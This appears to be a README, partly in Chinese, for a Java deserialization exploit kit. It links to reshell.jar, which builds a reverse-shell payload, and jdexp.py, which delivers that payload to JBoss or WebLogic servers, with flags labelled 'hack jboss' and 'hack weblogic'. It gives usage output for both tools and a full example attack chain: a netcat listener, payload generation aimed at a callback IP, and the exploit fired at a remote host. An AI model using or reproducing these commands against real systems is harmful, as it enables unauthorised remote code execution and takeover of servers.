# JavaDeserialization


用[reshell.jar](https://github.com/hackzx/JavaDeserialization/raw/master/reshell.jar "java1.8编译")生成反弹shell的payload，然后[jdexp.py](https://github.com/hackzx/JavaDeserialization/raw/master/jdexp.py)执行。

```
▶ java -jar reshell.jar
usage: reshell.jar host port path

……

positional arguments:
  host        reverse domain/IP
  port        reverse port
  path        generate payload file path

  
  
▶ python jdexp.py -h
usage: jdexp.py [-h] [-jboss] [-weblogic] host port payload

……

positional arguments:
  host        remote domain/IP
  port        remote port
  payload     local payload file

optional arguments:
  -h, --help  show this help message and exit
  -jboss      hack jboss
  -weblogic   hack weblogic
```

……

```
Example:

▶ nc -vvlp 888
▶ cp shell.jar /var/www/
▶ java -jar reshell.jar [ReverseIP] 888 /tmp/payload
▶ python jdexp.py -weblogic [RemoteIP] 7001 /tmp/payload
▶ python jdexp.py -jboss [RemoteIP] 80 /tmp/payload
```

 
